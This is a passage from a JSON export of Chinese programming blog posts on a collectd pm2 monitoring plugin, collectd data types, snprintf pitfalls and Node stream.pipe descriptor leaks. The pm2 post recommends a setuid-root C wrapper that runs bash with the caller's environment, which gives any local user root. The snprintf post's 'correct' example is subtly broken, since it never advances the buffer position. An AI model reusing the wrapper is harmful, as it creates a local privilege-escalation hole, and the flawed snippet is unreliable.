style=\"text-decoration: underline;\">, </span><span style=\"color: #66cccc; text-decoration: underline;\">''</span><span style=\"text-decoration: underline;\">) + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\n\"</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.stdout.write(<span style=\"color: #66cccc;\">\"PUTVAL \\\"\"</span> + hostname + <span style=\"color: #66cccc;\">\"/\"</span> + name + <span style=\"color: #66cccc;\">\"-memory_</span><span style=\"color: #66cccc; text-decoration: underline;\">used\"</span><span style=\"text-decoration: underline;\"> + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"/gauge-\"</span><span style=\"text-decoration: underline;\"> + item.pm_id + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\\" interval=\"</span><span style=\"text-decoration: underline;\"> + interval + </span><span style=\"color: #66cccc; text-decoration: underline;\">\" \"</span><span style=\"text-decoration: underline;\"> + timestamp + </span><span style=\"color: #66cccc; text-decoration: underline;\">\":\"</span><span style=\"text-decoration: underline;\"> + item.monit.memory + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\n\"</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.stdout.write(<span style=\"color: #66cccc;\">\"PUTVAL \\\"\"</span> + hostname + <span style=\"color: #66cccc;\">\"/\"</span> + name + <span style=\"color: #66cccc;\">\"-cpu_use</span><span style=\"color: #66cccc; text-decoration: underline;\">d\"</span><span style=\"text-decoration: underline;\"> + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"/gauge-\"</span><span style=\"text-decoration: underline;\"> + item.pm_id + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\\" interval=\"</span><span style=\"text-decoration: underline;\"> + interval + </span><span style=\"color: #66cccc; text-decoration: underline;\">\" \"</span><span style=\"text-decoration: underline;\"> + timestamp + </span><span style=\"color: #66cccc; text-decoration: underline;\">\":\"</span><span style=\"text-decoration: underline;\"> + item.monit.cpu + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\n\"</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.stdout.write(<span style=\"color: #66cccc;\">\"PUTVAL \\\"\"</span> + hostname + <span style=\"color: #66cccc;\">\"/\"</span> + name + <span style=\"color: #66cccc;\">\"-restart</span><span style=\"color: #66cccc; text-decoration: underline;\">_time\"</span><span style=\"text-decoration: underline;\"> + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"/gauge-\"</span><span style=\"text-decoration: underline;\"> + item.pm_id + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\\" interval=\"</span><span style=\"text-decoration: underline;\"> + interval + </span><span style=\"color: #66cccc; text-decoration: underline;\">\" \"</span><span style=\"text-decoration: underline;\"> + timestamp + </span><span style=\"color: #66cccc; text-decoration: underline;\">\":\"</span><span style=\"text-decoration: underline;\"> + item.pm2_env.restart_time + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\n\"</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.stdout.write(<span style=\"color: #66cccc;\">\"PUTVAL \\\"\"</span> + hostname + <span style=\"color: #66cccc;\">\"/\"</span> + name + <span style=\"color: #66cccc;\">\"-unstabl</span><span style=\"color: #66cccc; text-decoration: underline;\">e_restarts\"</span><span style=\"text-decoration: underline;\"> + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"/gauge-\"</span><span style=\"text-decoration: underline;\"> + item.pm_id + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\\" interval=\"</span><span style=\"text-decoration: underline;\"> + interval + </span><span style=\"color: #66cccc; text-decoration: underline;\">\" \"</span><span style=\"text-decoration: underline;\"> + timestamp + </span><span style=\"color: #66cccc; text-decoration: underline;\">\":\"</span><span style=\"text-decoration: underline;\"> + item.pm2_env.unstable_restarts + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\n\"</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   setTimeout(collect, interval*1000);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n}\n\ncollect();\n</pre>\n</div>\n\n<p>\npm2 是使用 root 帐号运行的，collectd exec 插件不允许以 root 权限运行收集统计的程序（collectd-pm2.js），一个简单的方法是用 c 写一个包裹程序，使用 <code>setuid</code> 切换到 root 帐号。\n</p>\n\n<p>\n<code>collectd-pm2-root.c</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;stdio.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;sys/types.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;sys/stat.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;sys/wait.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;unistd.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;stdlib.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;signal.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;string.h&gt;</span>\n\n\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">main</span>(<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">argc</span>, <span style=\"color: #6699cc;\">char</span>* <span style=\"color: #ffcc66;\">argv</span>[]) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (setuid(0) == -1 || setgid(0) == -1) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   perror(<span style=\"color: #66cccc;\">\"setuid or setgid to root user error\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"\\npermit setuid and setgid to root user: \\n\\tchown root</span><span style=\"color: #66cccc; text-decoration: underline;\">:root %s\\n\\tchmod 4755 %s\\n\"</span><span style=\"text-decoration: underline;\">, argv[0], argv[0]);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> EXIT_FAILURE;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> system(<span style=\"color: #66cccc;\">\"/bin/bash -c 'export PM2_HOME=${PM2_HOME:-~root/.pm2}; node /</span><span style=\"color: #66cccc; text-decoration: underline;\">usr/local/bin/collectd-pm2.js'\"</span><span style=\"text-decoration: underline;\">);</span>\n}\n</pre>\n</div>\n\n<p>\n编译安装\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gcc -O2 collectd-pm2-root.c -o collectd-pm2-root\ncp collectd-pm2-root /usr/local/bin\nchown root:root /usr/local/bin/collectd-pm2-root\nchmod 4755 /usr/local/bin/collectd-pm2-root\n</pre>\n</div>\n\n<p>\n配置 collectd，修改 <code>collectd.conf</code>\n</p>\n<pre class=\"example\">\nLoadPlugin exec\n\n&lt;Plugin exec&gt;\n    Exec \"nobody:nobody\" \"/usr/local/bin/collectd-pm2-root\"\n&lt;/Plugin&gt;\n</pre>\n\n<p>\n测试运行统计收集脚本\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo -u nobody -g nobody /usr/local/bin/collectd-pm2-root\n</pre>\n</div>\n\n<p>\n重启 collectd 生效即可。\n</p>\n\n<p>\n以上代码已在 github 开源：<a href=\"https://github.com/tangxinfa/collectd-pm2\">https://github.com/tangxinfa/collectd-pm2</a> 。</p>\n</div>\n</div>\n"
},
{
  "title": "collectd 数据类型详解",
  "timestamp": "2016-05-07 15:07:00",
  "tags": [
    "collectd"
  ],
  "body": "<p>\n<a href=\"https://collectd.org/documentation/manpages/collectd-exec.5.shtml\">man 5 collectd-exec</a>\n</p>\n<blockquote>\n<p>\ntype identifies the type and number of values (i. e. data-set) passed to collectd. A large list of predefined data-sets is available in the types.db file. See types.db(5) for a description of the format of this file.\n</p>\n</blockquote>\n<blockquote>\n<p>\ntype 标识传给 collectd 的值的类型和数量（即数据集）。types.db 中预定义了大量数据集（data-sets）。types.db 的格式描述可以查看 types.db(5) 手册。\n</p>\n</blockquote>\n\n<p>\n<a href=\"https://collectd.org/documentation/manpages/types.db.5.shtml\">man 5 types.db</a>\n</p>\n<blockquote>\n<p>\nThe types.db file contains one line for each data-set specification. Each line consists of two fields delimited by spaces and/or horizontal tabs. The first field defines the name of the data-set, while the second field defines a list of data-source specifications, delimited by spaces and, optionally, a comma (\",\") right after each list-entry.\n</p>\n\n<p>\nThe format of the data-source specification has been inspired by RRDtool's data-source specification. Each data-source is defined by a quadruple made up of the data-source name, type, minimal and maximal values, delimited by colons (\":\"): ds-name:ds-type:min:max. ds-type may be either ABSOLUTE, COUNTER, DERIVE, or GAUGE. min and max define the range of valid values for data stored for this data-source. If U is specified for either the min or max value, it will be set to unknown, meaning that no range checks will happen. See rrdcreate(1) for more details.\n</p>\n</blockquote>\n<blockquote>\n<p>\ntypes.db 文件每行定义一种数据集（data-set），为空格或水平制表符分隔的两个字段。第一个字段定义数据集名称，第二字段定义数据源规格列表，列表条目用空格或逗号分隔。\n</p>\n\n<p>\n数据源规格受到 RRDtool 启发。每一数据源定义为四元组，依次是名称、类型、最小值、最大值，使用冒号分隔：ds-name:ds-type:min:max。ds-type 可取 ABSOLUTE、COUNTER、DERIVE、GAUGE 之一。min 和 max 定义有效的取值范围，可以指定 min 或 max 为未知 U，表示不检查取值范围。查阅 rrdcreate(1) 手册了解更多。\n</p>\n</blockquote>\n\n<p>\n<a href=\"https://collectd.org/wiki/index.php/Data_source\">Data source - collectd Wiki</a>\n</p>\n<blockquote>\n<p>\nData source types\n</p>\n\n<p>\nThere are four data source types which are basically identical to the data source types of the same name in RRDtool:\n</p>\n\n<p>\nGAUGE\n</p>\n\n<p>\nA GAUGE value is simply stored as-is. This is the right choice for values which may increase as well as decrease, such as temperatures or the amount of memory used.\n</p>\n\n\n<p>\nDERIVE\n</p>\n\n<p>\nThese data sources assume that the change of the value is interesting, i.e. the derivative. Such data sources are very common with events that can be counted, for example the number of emails that have been received by an MTA since it was started. The total number of emails is not interesting, but the change since the value has been read the last time. The value is therefore converted to a rate using the following formula:\n</p>\n\n<p>\nrate = (value_new - value_old) / (time_new - time_old)\n</p>\n\n<p>\nPlease note that if value_new &lt; value_old, the resulting rate will be negative. If you set the minimum value to zero, such data points will be discarded. Using DERIVE data sources and a minimum value of zero is recommended for counters that rarely overflow, i.e. wrap-around after their maximum value has been reached. This data source type is available since version 4.8.\n</p>\n\n\n<p>\nCOUNTER\n</p>\n\n<p>\nThese data sources behave exactly like DERIVE data sources in the “normal” case. Their behavior differs when value_new &lt; value_old, i.e. when the new value is smaller than the previous value. In this case, COUNTER data sources will assume the counter “wrapped around” and take this into account. The formula for wrap-around cases is:\n</p>\n\n<p>\nrate = (2**width - value_old + value_new) / (time_new - time_old)\nwidth = value_old &lt; 2**32 ? 32 : 64\n</p>\n\n<p>\nPlease note that the rate of a COUNTER data source is never negative. If a counter is reset to zero, for example because an application was restarted, the wrap-around calculation may result in a huge rate. Thus setting a reasonable maximum value is essential when using COUNTER data sources. Because of this, COUNTER data sources are only recommended for counters that wrap-around often, for example 32 bit octet counters of a busy switch port.\n</p>\n\n\n<p>\nABSOLUTE\n</p>\n\n<p>\nThis is probably the most exotic type: It is intended for counters which are reset upon reading. In effect, the type is very similar to GAUGE except that the value is an (unsigned) integer and will be divided by the time since the last reading. This data source type is available since version 4.8 and has been added mainly for consistency with the data source types available in RRDtool.\n</p>\n</blockquote>\n<blockquote>\n<p>\n数据源类型\n</p>\n\n<p>\n源自 RRDtool 的四种数据源类型：\n</p>\n\n<p>\nGAUGE\n</p>\n\n<p>\nGAUGE 意为计量，其值简单地原样存储。用于可增减的值，如：温度或费用支出。\n</p>\n\n\n<p>\nDERIVE\n</p>\n\n<p>\nDERIVE 意为导数，关注值的变动，即导数。\n这样的数据源通常为可计数的事件，如：邮件客户端启动后收到的邮件数。\n相对于收件箱里的邮件总数，上次查看邮箱后新收到的邮件数量更值得关注。\n该值可以根据以下公式转化为速率：\n</p>\n\n<p>\nrate = (value_new - value_old) / (time_new - time_old)\n</p>\n\n<p>\n如果 value_new 小于 value_old，得出的 rate 为负。\n如果设置最小值（min）为 0 ，这个数据点将被丢弃。\n对于很少溢出（即达到最大值后回绕）的计数器推荐使用 DERIVE 数据源并设置最小值（min）为 0。\nDERIVE 类型从 4.8 版本开始提供。\n</p>\n\n\n<p>\nCOUNTER\n</p>\n\n<p>\nCOUNTER 意为计数器，”正常“情况下与 DERIVE 一样。\n细微的差异在于当 value_new 小于 value_old 时，COUNTER 数据源类型假设计数器已经“回绕”，计算速率的公式：\n</p>\n\n<p>\nrate = (2**width - value_old + value_new) / (time_new - time_old)\nwidth = value_old &lt; 2**32 ? 32 : 64\n</p>\n\n<p>\nCOUNTER 数据源类型计算出的速率（rate）值不为负。\n如果计数器被重置为 0，如当应用程序重启后，回绕计算可能导致结果为巨大的速率（rate）。\n当使用 COUNTER 数据源时，必须设置一个合理的最大值（max）。\n因此，COUNTER 数据源仅推荐用于常常会回绕的计数器，例如，繁忙的交换机端口的 32 位字节计数器。\n</p>\n\n\n<p>\nABSOLUTE\n</p>\n\n<p>\nABSOLUTE 意为绝对，可能是最特殊的类型：用于读取后会重置的计数器。\n效果上，它和 GAUGE 类型非常相似，除了它的值是无符号整型，还要与上次读取至今的时间相除。\n</p>\n\n<p>\n这个数据源类型从 4.8 版本开始提供，主要是为了和 RRDtool 保持一致。\n</p>\n</blockquote>\n\n<ul class=\"org-ul\">\n<li>数据集（Data Set）\n\n<p>\n传递到 collectd 的数据的定义，如 types.db 中的一条：\n</p>\n<pre class=\"example\">\nload            shortterm:GAUGE:0:5000, midterm:GAUGE:0:5000, longterm:GAUGE:0:5000\n</pre>\n\n<p>\n以上定义了一种数据集，名为 load，包括三个值：shortterm、midterm、longterm，这三个值的类型都是 GAUGE，取值范围 0-5000。\n</p>\n\n<p>\n详情参见 <a href=\"https://collectd.org/wiki/index.php/Data_set\">Data set - collectd Wiki</a>\n</p>\n</li>\n\n<li>数据源（Data Source）\n\n<p>\n就是数据集（Data Set）的值定义，为名称、类型、最小值、最大值四元组。\n</p>\n</li>\n\n<li>数据源类型（Data Source Type）\n\n<p>\n就是数据源中的类型字段，共有四种类型：ABSOLUTE、COUNTER、DERIVE、GAUGE。\n</p>\n</li>\n</ul>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">示例</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n以下 collectd-exec 插件示例脚本用到了 load 数据集\n</p>\n<pre class=\"example\">\n#!/bin/bash\n\nHOSTNAME=\"${COLLECTD_HOSTNAME:-localhost}\"\nINTERVAL=\"${COLLECTD_INTERVAL:-60}\"\n\nwhile [ 1 ]; do\n    echo \"PUTVAL \\\"$HOSTNAME/test_load/load\\\" interval=$INTERVAL N:1:2:3\"\n    sleep \"$INTERVAL\"\ndone\n</pre>\n\n<p>\n插件名称 <code>test_load</code> ，数据类型（数据集）为 <code>load</code> ， <code>N</code> 代指当前时间，shortterm、midterm、longterm 的值分别为 1、2、3。</p>\n</div>\n</div>\n"
},
{
  "title": "你很可能不懂 snprintf",
  "timestamp": "2016-05-13 20:36:00",
  "tags": [
    "c"
  ],
  "body": "<p>\nQ: <code>snprintf</code> 返回的是实际写入到缓冲区的字符数吗？\n</p>\n\n<p>\nA: 错。当缓冲区空间不足时会返回比缓存区空间大的值。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">man 3 snprintf</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n摘录关键部分\n</p>\n\n<p>\n原型写义\n</p>\n<blockquote>\n<p>\n#include &lt;stdio.h&gt;\n</p>\n\n\n<p>\nint sprintf(char *str, const char *format, &#x2026;);\n</p>\n\n<p>\nint snprintf(char *str, size_t size, const char *format, &#x2026;);\n</p>\n</blockquote>\n\n<p>\n功能描述\n</p>\n<blockquote>\n<p>\nThe functions in the printf() family produce output according to a format as described below.  The functions\nprintf()  and  vprintf()  write output to stdout, the standard output stream; fprintf() and vfprintf() write\noutput to the given output stream; sprintf(), snprintf(), vsprintf() and vsnprintf() write to the  character\nstring str.\n</p>\n\n<p>\nThe function dprintf() is the same as fprintf(3) except that it outputs to a file descriptor, fd, instead of\nto a stdio stream.\n</p>\n\n<p>\nThe functions snprintf() and vsnprintf() write at most size  bytes  (including  the  terminating  null  byte\n('\\0')) to str.\n</p>\n</blockquote>\n\n<p>\n返回值\n</p>\n<blockquote>\n<p>\nUpon  successful  return,  these  functions return the number of characters printed (excluding the null byte\nused to end output to strings).\n</p>\n\n<p>\nThe functions snprintf() and vsnprintf() do not write more than size bytes (including the  terminating  null\nbyte ('\\0')).  If the output was truncated due to this limit, then the return value is the number of charac‐\nters (excluding the terminating null byte) which would have been written to the final string if enough space\nhad  been  available.   Thus, a return value of size or more means that the output was truncated.  (See also\nbelow under NOTES.)\n</p>\n\n<p>\nIf an output error is encountered, a negative value is returned.\n</p>\n</blockquote>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">了解 snprintf</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\nsprintf 输出到缓冲区，提供的缓存区空间不足时，引发臭名昭著的 <code>缓存区溢出</code> 漏洞，snprintf 通过指定缓存区空间大小解决了这个问题。\n</p>\n\n<p>\nsnprintf 常用于字符串格式化（如：拼接 SQL 或 shell 命令），很多人会用它的返回值来指定下一次拼接的起始位置。\n</p>\n\n<p>\n如下代码所示：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #99cc99;\">const</span> <span style=\"color: #6699cc;\">char</span>* <span style=\"color: #ffcc66;\">fields</span>[] = {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"name\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"age\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"city\"</span>\n};\n\n<span style=\"color: #6699cc;\">char</span> <span style=\"color: #ffcc66;\">sql</span>[10] = <span style=\"color: #66cccc;\">\"select \"</span>;\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">pos</span> = 0;\n\n<span style=\"color: #99cc99;\">for</span>(<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">i</span> = 0; i &lt; <span style=\"color: #99cc99;\">sizeof</span>(fields)/<span style=\"color: #99cc99;\">sizeof</span>(fields[0]); ++i) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   pos += snprintf(sql + pos, <span style=\"color: #99cc99;\">sizeof</span>(sql) - pos, <span style=\"color: #66cccc;\">\"%s%s\"</span>, (i ? <span style=\"color: #66cccc;\">\", \"</span> : <span style=\"color: #66cccc;\">\"\"</span>), field<span style=\"text-decoration: underline;\">s[i]);</span>\n}\n\nsnprintf(sql + pos, <span style=\"color: #99cc99;\">sizeof</span>(sql) - pos, <span style=\"color: #66cccc;\">\" from users\"</span>);\n</pre>\n</div>\n\n<p>\n上面的代码没有处理缓存区不足的问题，最坏的结果仅仅是因缓存区空间不足而导致 sql 不完整吗？\n</p>\n\n<p>\n比那要严重多了，它还会导致”缓存区溢出“漏洞。\n</p>\n\n<p>\n这是因为，当缓冲区尺寸不足时，snprintf 会返回比缓冲区尺寸大的值，最后会导致传给 snprintf 的缓存区尺寸值为负数，\n转化为无符号整型（size_t）就是一个超大的整数值。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">使用 snprintf 的正确姿势</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">pos</span> = 0;\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">n</span> = snprintf(buffer + pos, <span style=\"color: #99cc99;\">sizeof</span>(buffer) - pos, <span style=\"color: #66cccc;\">\"%s\"</span>, <span style=\"color: #66cccc;\">\"hello\"</span>);\n<span style=\"color: #99cc99;\">if</span> (n &gt;= <span style=\"color: #99cc99;\">sizeof</span>(buffer) - pos) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">a return value of size or more means that the output was truncated</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"error: buffer size not enough\\n\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span>;\n}\nn += pos;\n\nn = snprintf(buffer + pos, <span style=\"color: #99cc99;\">sizeof</span>(buffer) - pos, <span style=\"color: #66cccc;\">\"%s\"</span>, <span style=\"color: #66cccc;\">\" snprintf\"</span>);\n<span style=\"color: #99cc99;\">if</span> (n &gt;= <span style=\"color: #99cc99;\">sizeof</span>(buffer) - pos) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">a return value of size or more means that the output was truncated</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"error: buffer size not enough\\n\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span>;\n}\nn += pos;\n</pre>\n</div>\n\n<p>\n下次在代码里，当你看到有人用 snprintf 进行”漂亮“的拼接，相信你会从”哇“改口为”操“了。</p>\n</div>\n</div>\n"
},
{
  "title": "关于 stream.pipe 你需要知道更多",
  "timestamp": "2016-05-22 01:58:00",
  "tags": [
    "node"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">关于 stream 用法的一个经典例子</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">http</span> = require(<span style=\"color: #66cccc;\">'http'</span>);\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">fs</span> = require(<span style=\"color: #66cccc;\">'fs'</span>);\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">server</span> = http.createServer(<span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">req</span>, <span style=\"color: #ffcc66;\">res</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">stream</span> = fs.createReadStream(__dirname + <span style=\"color: #66cccc;\">'/data.txt'</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   stream.pipe(res);\n});\nserver.listen(8000);\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">经典例子的致命问题</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n如果用户中断下载，文件不会关闭，导致文件句柄（fd）泄露，参见相关讨论：\n</p>\n\n<p>\n<a href=\"http://stackoverflow.com/questions/37317676/deleting-file-in-node-js-not-working\">express - Deleting file in node.js not working - Stack Overflow</a>\n</p>\n\n<p>\n修复如下\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">http</span> = require(<span style=\"color: #66cccc;\">'http'</span>);\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">fs</span> = require(<span style=\"color: #66cccc;\">'fs'</span>);\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">server</span> = http.createServer(<span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">req</span>, <span style=\"color: #ffcc66;\">res</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">stream</span> = fs.createReadStream(__dirname + <span style=\"color: #66cccc;\">'/data.txt'</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   stream.pipe(res).once(<span style=\"color: #66cccc;\">'close'</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   stream.destroy();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n});\nserver.listen(8000);\n</pre>\n</div>\n<p>\nstream.destroy（同 stream.close） 是一个未文档化的 API，来自 fs.ReadStream ，\n如此重要的一个函数竟然未文档化（至少现在还是未文档化状态，当前 node.js 版本为 v6.2.0）。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">关键 API 文档</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https://nodejs.org/api/stream.html#stream_readable_pipe_destination_options\">stream.pipe</a> 文档\n</p>\n<blockquote>\n<p>\nreadable.pipe(destination[, options])#\n</p>\n\n<ul class=\"org-ul\">\n<li>destination Writable Stream The destination for writing data\n</li>\n<li>options Object Pipe options\n<ul class=\"org-ul\">\n<li>end Boolean End the writer when the reader ends. Default = true\n</li>\n</ul>\n</li>\n</ul>\n\n<p>\nThis method pulls all the data out of a readable stream, and writes it to the supplied\ndestination, automatically managing the flow so that the destination is not overwhelmed\nby a fast readable stream.\n</p>\n</blockquote>\n\n<p>\n<a href=\"https://nodejs.org/api/fs.html#fs_fs_createreadstream_path_options\">fs.createReadStream</a> 文档\n</p>\n<blockquote>\n<p>\nfs.createReadStream(path[, options])#\n</p>\n\n<p>\nReturns a new ReadStream object (See Readable Stream).\n</p>\n\n<p>\nBe aware that, unlike the default value set for highWaterMark on a readable stream (16\nkb), the stream returned by this method has a default value of 64 kb for the same\nparameter.\n</p>\n\n<p>\noptions is an object or string with the following defaults:\n</p>\n\n<p>\n{ flags: 'r',\n  encoding: null,\n  fd: null,\n  mode: 0o666,\n  autoClose: true\n}\n</p>\n\n<p>\noptions can include start and end values to read a range of bytes from the file instead\nof the entire file. Both start and end are inclusive and start at 0. The encoding can be\n'utf8', 'ascii', or 'base64'.\n</p>\n\n<p>\nIf fd is specified, ReadStream will ignore the path argument and will use the specified\nfile descriptor. This means that no open event will be emitted.\n</p>\n\n<p>\nIf autoClose is false, then the file descriptor won't be closed, even if there's an\nerror. It is your responsibility to close it and make sure there's no file descriptor\nleak. If autoClose is set to true (default behavior), on error or end the file descriptor\nwill be closed automatically.\n</p>\n\n<p>\nmode sets the file mode (permission and sticky bits), but only if the file was created.\n</p>\n\n<p>\nAn example to read the last 10 bytes of a file which is 100 bytes long:\n</p>\n\n<p>\nfs.createReadStream('sample.txt', {start: 90, end: 99});\n</p>\n\n<p>\nIf options is a string, then it specifies the encoding.\n</p>\n</blockquote>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">stream.pipe 的工作原理</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\nstream.pipe 将可读流（Readable Stream）连接到可写流（Writable Stream），\n数据会从可读流传输到可写流，支持自动流量控制。\n</p>\n\n<p>\n上面的 stream.pipe 其实是调用的 Readable.pipe，其流程简述如下：\n</p>\n\n<ul class=\"org-ul\">\n<li>监听可读流的 data 事件：将读取到的数据写入可写流，如果可写流缓冲区满，则暂停可读流。\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>监听可写流的 drain 事件：实现自动流量控制。\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>监听可写流的 unpipe 事件：取消所有事件监听。\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>监听可写流的 close、finish 事件：调用可读流的 unpipe()，触发可写流的 unpipe 事件。\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>监听可读流的 end 事件：调用可写流的 